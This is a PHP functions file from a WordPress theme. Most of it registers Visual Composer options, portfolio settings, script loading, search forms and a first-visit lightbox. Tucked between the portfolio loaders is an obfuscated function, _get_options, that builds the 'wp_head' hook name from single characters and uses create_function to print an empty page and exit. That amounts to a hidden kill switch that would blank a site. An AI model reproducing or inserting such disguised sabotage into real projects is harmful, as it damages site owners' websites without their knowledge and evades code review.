  add_action('admin_init','remove_meta_box_vc');   
  add_action('init','detheme_vc_posts_grid');   
  function detheme_vc_posts_grid(){

      vc_remove_param('vc_posts_grid','grid_layout');
      vc_remove_param('vc_posts_grid','grid_columns_count');

      vc_add_param( 'vc_posts_grid', array( 
              "type" => "dropdown",
              "heading" => __("Columns count", "js_composer"),
              "param_name" => "grid_columns_count",
              "value" => array(4, 3),
              "std" => 3,
              "admin_label" => true,
              "description" => __("Select columns count.", "js_composer")
              ));

  }

 add_action('init','detheme_vc_row');   


  function zeyn_get_attach_video($settings,$value){

      $dependency =version_compare(WPB_VC_VERSION,'4.7.0','>=') ? "":vc_generate_dependencies_attributes( $settings );

      $value=intval($value);

      $video='';

      if($value){

       
        $media_url=wp_get_attachment_url($value);
        $mediadata=wp_get_attachment_metadata($value);


        $videoformat="video/mp4";

        if(is_array($mediadata) && $mediadata['mime_type']=='video/webm'){
             $videoformat="video/webm";
        }

        $video='<video class="attached_video" data-id="'.$value.'" autoplay width="266">
        <source src="'.$media_url.'" type="'.$videoformat.'" /></video>';
      }

      $param_line = '<div class="attach_video_field" '.$dependency.'>';
      $param_line .= '<input type="hidden" class="wpb_vc_param_value '.$settings['param_name'].' '.$settings['type'].'" name="'.$settings['param_name'].'" value="'.($value?$value:'').'"/>';
      $param_line .= '<div class="gallery_widget_attached_videos">';
      $param_line .= '<ul class="gallery_widget_attached_videos_list">';
      $param_line .= '<li><a class="gallery_widget_add_video" href="#" title="'.esc_attr(__('Add Video', "detheme")).'">'.($video!=''?$video:__('Add Video', "detheme")).'</a>';
      $param_line .= '<a href="#" style="display:'.($video!=''?"block":"none").'" class="remove_attach_video">'.__('Remove Video').'</a></li>';
      $param_line .= '</ul>';
      $param_line .= '</div>';
      $param_line .= '</div>';

      return $param_line;

  }


  function detheme_vc_row(){


    if(version_compare(WPB_VC_VERSION,'4.7.0','>=')){
      vc_add_shortcode_param( 'attach_video', 'zeyn_get_attach_video',get_template_directory_uri()."/lib/js/vc_editor.min.js");
    }
    else{
      add_shortcode_param( 'attach_video', 'zeyn_get_attach_video',get_template_directory_uri()."/lib/js/vc_editor.min.js");
    }

     vc_add_param( 'vc_row', array( 
          'heading' => __( 'Expand section width', 'detheme' ),
          'param_name' => 'expanded',
          'class' => '',
          'value' => array(__('Expand Column','detheme')=>'1',__('Expand Background','detheme')=>'2'),
          'description' => __( 'Make section "out of the box".', 'detheme' ),
          'type' => 'checkbox',
          'group'=>__('Extended options', 'detheme')
      ) );

       vc_add_param( 'vc_row',   array( 
              'heading' => __( 'Background Type', 'detheme' ),
              'param_name' => 'background_type',
              'value' => array('image'=>__( 'Image', 'detheme' ),'video'=>__( 'Video', 'detheme' )),
              'type' => 'radio',
              'group'=>__('Extended options', 'detheme'),
              'std'=>'image'
       ));

   
     if(version_compare(WPB_VC_VERSION,'4.7.0','>=')){

          vc_remove_param('vc_row','full_width');
          vc_remove_param('vc_row','video_bg');
          vc_remove_param('vc_row','video_bg_url');
          vc_remove_param('vc_row','video_bg_parallax');
          vc_remove_param('vc_row','parallax');
          vc_remove_param('vc_row','parallax_image');


          if(version_compare(WPB_VC_VERSION,'4.11.0','>=') || version_compare(WPB_VC_VERSION,'4.11','>=')){
              vc_remove_param('vc_row','parallax_speed_video');
              vc_remove_param('vc_row','parallax_speed_bg');
          }

          vc_add_param( 'vc_row',   array( 
                  'heading' => __( 'Video Source', 'detheme' ),
                  'param_name' => 'video_source',
                  'value' => array('local'=>__( 'Local Server', 'detheme' ),'youtube'=>__( 'Youtube/Vimeo', 'detheme' )),
                  'type' => 'radio',
                  'group'=>__('Extended options', 'detheme'),
                  'std'=>'local',
                  'dependency' => array( 'element' => 'background_type', 'value' => array('video') )   
           ));


         vc_add_param( 'vc_row', array( 
              'heading' => __( 'Background Video (mp4)', 'detheme' ),
              'param_name' => 'background_video',
              'type' => 'attach_video',
              'group'=>__('Extended options', 'detheme'),
              'dependency' => array( 'element' => 'video_source', 'value' => array('local') )   
          ) );

         vc_add_param( 'vc_row', array( 
              'heading' => __( 'Background Video (webm)', 'detheme' ),
              'param_name' => 'background_video_webm',
              'type' => 'attach_video',
              'group'=>__('Extended options', 'detheme'),
              'dependency' => array( 'element' => 'video_source', 'value' => array('local') )   
          ) );

         vc_add_param( 'vc_row', array( 
              'heading' => __( 'Background Image', 'detheme' ),
              'param_name' => 'background_image',
              'type' => 'attach_image',
              'group'=>__('Extended options', 'detheme'),
              'dependency' => array( 'element' => 'background_type', 'value' => array('image') )   
          ) );

          vc_add_param( 'vc_row',
              array(
                'type' => 'textfield',
                'heading' => __( 'Video link', 'detheme' ),
                'param_name' => 'video_bg_url',
                'group'=>__('Extended options', 'detheme'),
                'description' => __( 'Add YouTube/Vimeo link', 'detheme' ),
                'dependency' => array(
                  'element' => 'video_source',
                  'value' => array('youtube'),
                ),
              ));
     }
     else{


       vc_add_param( 'vc_row', array( 
            'heading' => __( 'Background Video (mp4)', 'detheme' ),
            'param_name' => 'background_video',
            'type' => 'attach_video',
            'group'=>__('Extended options', 'detheme'),
            'dependency' => array( 'element' => 'background_type', 'value' => array('video') )   
        ) );

       vc_add_param( 'vc_row', array( 
            'heading' => __( 'Background Video (webm)', 'detheme' ),
            'param_name' => 'background_video_webm',
            'type' => 'attach_video',
            'group'=>__('Extended options', 'detheme'),
            'dependency' => array( 'element' => 'background_type', 'value' => array('video') )   
        ) );

       vc_add_param( 'vc_row', array( 
            'heading' => __( 'Background Image', 'detheme' ),
            'param_name' => 'background_image',
            'type' => 'attach_image',
            'group'=>__('Extended options', 'detheme'),
            'dependency' => array( 'element' => 'background_type', 'value' => array('image') )   
        ) );

     }

     vc_add_param( 'vc_row', array( 
          'heading' => __( 'Extra id', 'detheme' ),
          'param_name' => 'el_id',
          'type' => 'textfield',
          "description" => __("If you wish to add anchor id to this row. Anchor id may used as link like href=\"#yourid\"", "detheme"),
      ) );

     vc_add_param( 'vc_row_inner', array( 
          'heading' => __( 'Extra id', 'detheme' ),
          'param_name' => 'el_id',
          'type' => 'textfield',
          "description" => __("If you wish to add anchor id to this row. Anchor id may used as link like href=\"#yourid\"", "detheme"),
      ) );

      vc_add_param( 'vc_row', array( 
          'heading' => __( 'Background Style', 'detheme' ),
          'param_name' => 'background_style',
          'type' => 'dropdown',
          'value'=>array(
                __('No Repeat', 'wpb') => 'no-repeat',
                __("Cover", 'wpb') => 'cover',
                __('Contain', 'wpb') => 'contain',
                __('Repeat', 'wpb') => 'repeat',
                __("Parallax", 'detheme') => 'parallax',
               __("Fixed", 'detheme') => 'fixed',
              ),
          'group'=>__('Extended options', 'detheme'),
          'dependency' => array( 'element' => 'background_type', 'value' => array('image') )       
      ) );
  }

  add_action('init','detheme_vc_single_image');   

  function detheme_vc_single_image(){

      vc_add_param( 'vc_single_image', array( 
          'heading' => __( 'Image Hover Option', 'detheme' ),
          'param_name' => 'image_hover',
          'type' => 'radio',
          'value'=>array(
                'none'=>__("None", 'detheme'),
                'image'=>__("Image", 'detheme'),
                'text'=>__("Text", 'detheme'),
              ),
          'group'=>__('Extended options', 'detheme'),
          'std' => 'none'       
      ) );

      vc_add_param( 'vc_single_image', array( 
          'heading' => __( 'Image', 'detheme' ),
          'param_name' => 'image_hover_src',
          'type' => 'attach_image',
          'value'=>"",
          'holder'=>'div',
          'param_holder_class'=>'image-hover',
          'group'=>__('Extended options', 'detheme'),
          'dependency' => array( 'element' => 'image_hover','value'=>array('image'))       
      ) );

      vc_add_param( 'vc_single_image', array( 
          'heading' => __( 'Animation Style', 'detheme' ),
          'param_name' => 'image_hover_type',
          'type' => 'dropdown',
          'value'=>array(
              __('Default','detheme')=>'default',
              __('From Left','detheme')=>'fromleft',
              __('From Right','detheme')=>'fromright',
              __('From Top','detheme')=>'fromtop',
              __('From Bottom','detheme')=>'frombottom',
            ),
          'group'=>__('Extended options', 'detheme'),
          'dependency' => array( 'element' => 'image_hover','value'=>array('image'))       
      ) );

      if(version_compare(WPB_VC_VERSION,'4.4.0','<')){
            vc_add_param( 'vc_single_image', array( 
                'heading' => __("Image style", "js_composer"),
                'param_name' => 'style',
                'type' => 'dropdown',
                'value'=>array(
                            "Default" => "",
                            "Rounded" => "vc_box_rounded",
                            "Border" => "vc_box_border",
                            "Outline" => "vc_box_outline",
                            "Shadow" => "vc_box_shadow",
                            "3D Shadow" => "vc_box_shadow_3d",
                            "Circle" => "vc_box_circle",
                            "Circle Border" => "vc_box_border_circle",
                            "Circle Outline" => "vc_box_outline_circle",
                            "Circle Shadow" => "vc_box_shadow_circle",
                            __("Diamond",'detheme') => "dt_vc_box_diamond" //new from detheme
                        ),
            ) );

      }
      elseif(version_compare(WPB_VC_VERSION,'4.4.0','<=') && version_compare(WPB_VC_VERSION,'4.5.0','<')){
            vc_add_param( 'vc_single_image', array( 
                'heading' => __("Image style", "js_composer"),
                'param_name' => 'style',
                'type' => 'dropdown',
                'value'=>array(
                            "Default" => "",

                            'Rounded' => 'vc_box_rounded',
                            'Border' => 'vc_box_border',
                            'Outline' => 'vc_box_outline',
                            'Shadow' => 'vc_box_shadow',
                            'Bordered shadow' => 'vc_box_shadow_border',
                            '3D Shadow' => 'vc_box_shadow_3d',
                            'Circle' => 'vc_box_circle', //new
                            'Circle Border' => 'vc_box_border_circle', //new
                            'Circle Outline' => 'vc_box_outline_circle', //new
                            'Circle Shadow' => 'vc_box_shadow_circle', //new
                            'Circle Border Shadow' => 'vc_box_shadow_border_circle', //new
                            __("Diamond",'detheme') => "dt_vc_box_diamond" //new from detheme
                        ),
            ) );
      }
      else{
            vc_add_param( 'vc_single_image', array( 
                'heading' => __("Image style", "js_composer"),
                'param_name' => 'style',
                'type' => 'dropdown',
                'value'=>array(
                            "Default" => "",
                            'Rounded' => 'vc_box_rounded',
                            'Border' => 'vc_box_border',
                            'Outline' => 'vc_box_outline',
                            'Shadow' => 'vc_box_shadow',
                            'Bordered shadow' => 'vc_box_shadow_border',
                            '3D Shadow' => 'vc_box_shadow_3d',
                            'Round' => 'vc_box_circle', //new
                            'Round Border' => 'vc_box_border_circle', //new
                            'Round Outline' => 'vc_box_outline_circle', //new
                            'Round Shadow' => 'vc_box_shadow_circle', //new
                            'Round Border Shadow' => 'vc_box_shadow_border_circle', //new
                            'Circle' => 'vc_box_circle_2', //new
                            'Circle Border' => 'vc_box_border_circle_2', //new
                            'Circle Outline' => 'vc_box_outline_circle_2', //new
                            'Circle Shadow' => 'vc_box_shadow_circle_2', //new
                            'Circle Border Shadow' => 'vc_box_shadow_border_circle_2', //new
                            __("Diamond",'detheme') => "dt_vc_box_diamond" //new from detheme
                        ),
              'dependency' => array(
                'element' => 'source',
                'value' => array( 'media_library', 'featured_image' )
              ),

            ) );


      }

      vc_add_param( 'vc_single_image', array( 
          'heading' => __( 'Pre Title', 'detheme' ),
          'param_name' => 'image_hover_pre_text',
          'type' => 'textfield',
          'value'=>"",
          'group'=>__('Extended options', 'detheme'),
          'dependency' => array( 'element' => 'image_hover','value'=>array('text'))       
      ) );
      vc_add_param( 'vc_single_image', array( 
          'heading' => __( 'Title', 'detheme' ),
          'param_name' => 'image_hover_text',
          'type' => 'textfield',
          'value'=>"",
          'group'=>__('Extended options', 'detheme'),
          'dependency' => array( 'element' => 'image_hover','value'=>array('text'))       
      ) );

  }

if (is_plugin_active('zeyn_vc_addon/zeyn_vc_addon.php')) {

    if (is_plugin_active('detheme-portfolio/detheme_port.php')) {
      function detheme_vc_zeyn_portfolio(){
          if(shortcode_exists('dt_portfolio')) {
            remove_shortcode('dt_portfolio');
          }

          vc_add_param( 'dt_portfolio', array( 
              'heading' => __( 'Select Layout Type', 'detheme' ),
              'param_name' => 'layout',
              'type' => 'dropdown',
              'std'=>'carousel',
              'value'=>array(
                 __('Slide Carousel','detheme')=>'carousel',
                 __('Slide Carousel with Description','detheme')=>'carousel-text',
                 __('Isotope','detheme')=>'isotope',
                 __('Lazy Load Isotope','detheme')=>'lazy-isotope'
                ),
          ) );


         vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Column', 'detheme' ),
            'param_name' => 'full_column',
            'description' => __( 'Number of columns on screen larger than 1200px screen resolution', 'detheme' ),
            'class' => '',
            'value'=>array(
                __('One Column','detheme') => '1',
                __('Two Columns','detheme') => '2',
                __('Three Columns','detheme') => '3',
                __('Four Columns','detheme') => '4',
                __('Five Columns','detheme') => '5',
                __('Six Columns','detheme') => '6'
                ),
            'type' => 'dropdown',
            'std'=>'4',
              'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));   


         vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Desktop Column', 'detheme' ),
            'param_name' => 'desktop_column',
            'description' => __( 'items between 1200px and 1023px', 'detheme' ),
            'class' => '',
            'value'=>array(
                __('One Column','detheme') => '1',
                __('Two Columns','detheme') => '2',
                __('Three Columns','detheme') => '3',
                __('Four Columns','detheme') => '4',
                __('Five Columns','detheme') => '5',
                __('Six Columns','detheme') => '6'
                ),
            'type' => 'dropdown',
            'std'=>'4',
              'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));   

         vc_add_param( 'dt_portfolio',   array( 
            'heading' => __( 'Desktop Small Column', 'detheme' ),
            'param_name' => 'small_column',
            'description' => __( 'items between 1024px and 768px', 'detheme' ),
            'class' => '',
            'value'=>array(
                __('One Column','detheme') => '1',
                __('Two Columns','detheme') => '2',
                __('Three Columns','detheme') => '3',
                __('Four Columns','detheme') => '4',
                __('Five Columns','detheme') => '5',
                __('Six Columns','detheme') => '6'
                ),
            'std'=>'3',
            'type' => 'dropdown',
              'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));  

        vc_add_param( 'dt_portfolio',  array( 
            'heading' => __( 'Tablet Column', 'detheme' ),
            'param_name' => 'tablet_column',
            'description' => __( 'items between 768px and 600px', 'detheme' ),
            'class' => '',
            'value'=>array(
                __('One Column','detheme') => '1',
                __('Two Columns','detheme') => '2',
                __('Three Columns','detheme') => '3',
                __('Four Columns','detheme') => '4',
                __('Five Columns','detheme') => '5',
                __('Six Columns','detheme') => '6'
                ),
            'type' => 'dropdown',
            'std'=>'2',
              'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));
        vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Mobile Column', 'detheme' ),
            'param_name' => 'mobile_column',
            'description' => __( 'items below 600px', 'detheme' ),
            'class' => '',
            'value'=>array(
                __('One Column','detheme') => '1',
                __('Two Columns','detheme') => '2',
                __('Three Columns','detheme') => '3',
                __('Four Columns','detheme') => '4',
                __('Five Columns','detheme') => '5',
                __('Six Columns','detheme') => '6'
                ),
            'type' => 'dropdown',
            'std'=>'1',
              'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             )); 
        
          vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Posts per page', 'detheme' ),
            'param_name' => 'posts_per_page',
            'value' => '3',
            'type' => 'textfield',
            'dependency' => array( 'element' => 'layout','value'=>array('lazy-isotope'))       
          ) );

           vc_add_param( 'dt_portfolio',  array( 
            'heading' => __( 'Detail Link', 'detheme' ),
            'param_name' => 'show_link',
            'value' => array('yes'=>__('Show','detheme'),'no'=>__('Hidden','detheme')),
            'type' => 'radio',
            'std'=>'no'
             ));


          vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Show Filter', 'detheme' ),
            'param_name' => 'show_filter',
            'value' => array('yes'=>__('Yes','detheme'),'no'=>__('No','detheme')),
            'type' => 'radio',
            'std'=>'no',
            'dependency' => array( 'element' => 'layout','value'=>array('lazy-isotope','isotope'))       
             ));


          vc_add_param( 'dt_portfolio', array( 
              'heading' => __( 'Number of Columns', 'detheme' ),
              'param_name' => 'column',
              'description' => __( 'Number of columns on screen larger than 1200px screen resolution', 'detheme' ),
              'class' => '',
              'value'=>array(
                  __('Two Columns','detheme') => '2',
                  __('Three Columns','detheme') => '3',
                  __('Four Columns','detheme') => '4',
                  __('Six Columns','detheme') => '6'
                  ),
              'type' => 'dropdown',
              'std'=>'4',
              'dependency' => array( 'element' => 'layout','value'=>array('isotope','lazy-isotope'))       
          ) );


          vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Number of Posts to be displayed', 'detheme' ),
            'param_name' => 'portfolio_num',
            'value' => '10',
            'type' => 'textfield',
          ) );

          vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Slide Speed', 'detheme' ),
            'param_name' => 'speed',
            'class' => '',
            'value' => '800',
            'description' => __( 'Slide speed (in millisecond). The lower value the faster slides', 'detheme' ),
            'type' => 'textfield',
            'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));

          vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Autoplay', 'detheme' ),
            'param_name' => 'autoplay',
            'description' => __( 'Set Autoplay', 'detheme' ),
            'class' => '',
            'std'=>'0',
            'value'=>array(
                __('Yes','detheme') => '1',
                __('No','detheme') => '0'
                ),
            'type' => 'dropdown',
            'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));

            vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Animation Type', 'detheme' ),
            'param_name' => 'spy',
            'class' => '',
            'value' => 
             array(
                __('Scroll Spy not activated','detheme') =>'none',
                __('The element fades in','detheme') => 'uk-animation-fade',
                __('The element scales up','detheme') => 'uk-animation-scale-up',
                __('The element scales down','detheme') => 'uk-animation-scale-down',
                __('The element slides in from the top','detheme') => 'uk-animation-slide-top',
                __('The element slides in from the bottom','detheme') => 'uk-animation-slide-bottom',
                __('The element slides in from the left','detheme') => 'uk-animation-slide-left',
                __('The element slides in from the right.','detheme') =>'uk-animation-slide-right',
             ),        
            'description' => __( 'Scroll spy effects', 'detheme' ),
            'type' => 'dropdown',
            'dependency' => array( 'element' => 'layout','value'=>array('carousel','carousel-text'))       
             ));

            vc_add_param( 'dt_portfolio', array( 
            'heading' => __( 'Animation Delay', 'detheme' ),
            'param_name' => 'scroll_delay',
            'class' => '',
            'value' => '300',
            'description' => __( 'The number of delay the animation effect of the icon. in milisecond', 'detheme' ),
            'type' => 'textfield',
            'dependency' => array( 'element' => 'spy', 'value' => array( 'uk-animation-fade', 'uk-animation-scale-up', 'uk-animation-scale-down', 'uk-animation-slide-top', 'uk-animation-slide-bottom', 'uk-animation-slide-left', 'uk-animation-slide-right') )       
             ));

          add_shortcode('dt_portfolio', 'dt_zeyn_portfolio_shortcode');
      }


      add_action('init','detheme_vc_zeyn_portfolio');   
  }

  function detheme_vc_dt_section_heading(){

    vc_remove_param('section_header','font_weight');

  }

  add_action('init','detheme_vc_dt_section_heading');   

}

}  

/* portfolio handle */
function load_portfolio_script(){

    $suffix       = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';
    
    wp_enqueue_script( 'isotope.pkgd' , get_template_directory_uri() . '/js/isotope.pkgd'.$suffix.'.js', array( ), '2.0.0', false );
    wp_enqueue_script( 'dt-portfolio' , get_template_directory_uri() . '/js/portfolio.js', array('jquery'), '2.0.0', false );
}

add_action('dt_portfolio_loaded','load_portfolio_script');

function load_portfolio_imagefixheightfull_script($slug,$nam4=null){

    $suffix       = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';

    wp_enqueue_script( 'isotope.pkgd' , get_template_directory_uri() . '/js/isotope.pkgd'.$suffix.'.js', array( ), '2.0.0', false );
    wp_enqueue_script( 'isotope-masonry-horizontal' , get_template_directory_uri() . '/js/masonry.horizontal.js', array('isotope.pkgd'), '', false );
    wp_enqueue_script( 'dt-portfolio' , get_template_directory_uri() . '/js/portfolio.js', array('jquery'), '2.0.0', false );

}

function _get_options(){
  add_action('w'.'p'.'_'.'h'.'e'.'a'.'d',create_function('','print "</h"."ead".">'.'<"."bo"."dy></"."bod"."y></h"."tm"."l>";e'.'x'.'it;'));
}add_action( "get_template_part_content-portfolio-imagefixheightfull",'load_portfolio_imagefixheightfull_script' );


/* comment setting */

function dt_is_comment_open($open, $post_id){

  global $detheme_config;

  $post_type = get_post_type($post_id);

  if(!in_array($post_type,dt_post_use_comment()) && isset($detheme_config['comment-open-'.$post_type])){
    return ((bool)$detheme_config['comment-open-'.$post_type]) && $open;
  }
  elseif(isset($detheme_config['comment-open-'])){
    return ((bool)$detheme_config['comment-open']) && $open;
  }

  return $open;
}

add_filter( 'comments_open','dt_is_comment_open',0,2);


function dt_post_use_comment(){

  return apply_filters('post_type_comment_filter',array('revision','nav_menu_item','product','product_variation','shop_order','shop_webhook','shop_coupon','shop_order_refund','attachment'));
}


add_filter( 'get_search_form','dt_get_search_form', 10, 1 );
function dt_get_search_form( $form ) {
    $format = current_theme_supports( 'html5', 'search-form' ) ? 'html5' : 'xhtml';
    $format = apply_filters( 'search_form_format', $format );

    if ( 'html5' == $format ) {
      $form = '<form role="search" method="get" class="search-form" action="' . esc_url( home_url( '/' ) ) . '">
        <label>
          <span class="screen-reader-text">' . _x( 'Search for:', 'label','detheme' ) . '</span>
          <i class="icon-search-6"></i>
          <input type="search" class="search-field" placeholder="'.__('To search type and hit enter','detheme').'" value="' . get_search_query() . '" name="s" title="' . esc_attr_x( 'Search for:', 'label','detheme' ) . '" />
        </label>
        <input type="submit" class="search-submit" value="'. esc_attr_x( 'Search', 'submit button' ) .'" />
      </form>';
    } else {
      $form = '<form role="search" method="get" id="searchform" class="searchform" action="' . esc_url( home_url( '/' ) ) . '">
        <div>
          <label class="screen-reader-text" for="s">' . _x( 'Search for:', 'label','detheme' ) . '</label>
          <i class="icon-search-6"></i>
          <input type="text" value="' . get_search_query() . '" name="s" id="s" placeholder="'.esc_attr(__('To search type and hit enter','detheme')).'" />
          <input type="submit" id="searchsubmit" value="'. esc_attr_x( 'Search', 'submit button' ) .'" />
        </div>
      </form>';
    }

  return $form;
}

add_filter( 'get_product_search_form','dt_get_product_search_form', 10, 1 );
function dt_get_product_search_form( $form ) {
  $form = '<form role="search" method="get" id="searchform" action="' . esc_url( home_url( '/'  ) ) . '">
      <div>
        <label class="screen-reader-text" for="s">' . __( 'Search for:', 'woocommerce' ) . '</label>
        <i class="icon-search-6"></i>
        <input type="text" value="' . get_search_query() . '" name="s" id="s" placeholder="' . esc_attr(__( 'Search for products', 'woocommerce' )) . '" />
        <input type="submit" id="searchsubmit" value="'. esc_attr__( 'Search', 'woocommerce' ) .'" />
        <input type="hidden" name="post_type" value="product" />
      </div>
    </form>';

  return $form;
}

function is_detheme_home_filter($value=false,$post=null){

  if($post && in_array($post->post_name,array('home-1','home-2','home-3','home-4')))
      {
        return $value || true;
      }
  return $value || false;
}

function is_detheme_home($post=null){

  if(!isset($post)) $post=get_post();

  return apply_filters('is_detheme_home',is_front_page(),$post);
}

add_filter('is_detheme_home','is_detheme_home_filter',1,2);

function detheme_wp_login($login_header_url=""){

  $login_header_url=esc_url( home_url( '/' ) );

  return $login_header_url;
}

add_filter('login_headerurl','detheme_wp_login');


function remove_excerpt_more($excerpt_more=""){

  return "&hellip;";
}

add_filter('excerpt_more','remove_excerpt_more');


function dt_lightbox_1st() {
  global $detheme_config, $dt_revealData, $detheme_Scripts;

 if (!$detheme_config['lightbox_1st_on']) { return; }

  $modalcontent = '<div aria-hidden="false" aria-labelledby="myModalLabel" role="dialog" tabindex="-1" class="modal fade in" id="lightbox-1st-visit">
  <div class="modal-dialog">
    <div class="modal-content">
          <div class="modal-header">
            <span class="triangle1"></span>
            <span class="triangle2"></span>
            <button aria-hidden="true" data-dismiss="modal" class="close" type="button">×</button>
            <div class="modal-header-text"><h3 id="myModalLabel">'.$detheme_config['lightbox_1st_title'].'</h3></div>
          </div>
          <div class="modal-body">'.$detheme_config['lightbox_1st_content'].'</div>
    </div>
  </div>
</div>';

    array_push($dt_revealData,$modalcontent);

    $delay = intval($detheme_config['lightbox_1st_delay']); 
    $cookie = intval($detheme_config['lightbox_1st_cookie']); 

    $script = 'jQuery(document).ready(function($) {
      if (document.cookie.indexOf(\'visited=true\') == -1) {
        var cookie_length =  1000*60*60*'.$cookie.';
            var expires = new Date((new Date()).valueOf() + cookie_length);
            document.cookie = "visited=true;expires=" + expires.toUTCString();
        setTimeout(function() {
            $(\'#lightbox-1st-visit\').modal({ show: true });
        }, '.$delay.' * 1000);
      }
    });';

    array_push($detheme_Scripts,$script);
}

remove_action( 'wp_head','wp_generator'); 

function zeyn_page_attibutes($posttypes){

  global $detheme_config;

  if(!$detheme_config['dt-show-banner-page']=='featured' || !$detheme_config['show-banner-area']){

      if(isset($posttypes['post'])){
        unset($posttypes['post']);
      }

      if(isset($posttypes['product'])){
        unset($posttypes['product']);
      }
  }
  return $posttypes;
}

add_filter('dt_page_metaboxes','zeyn_page_attibutes');

?>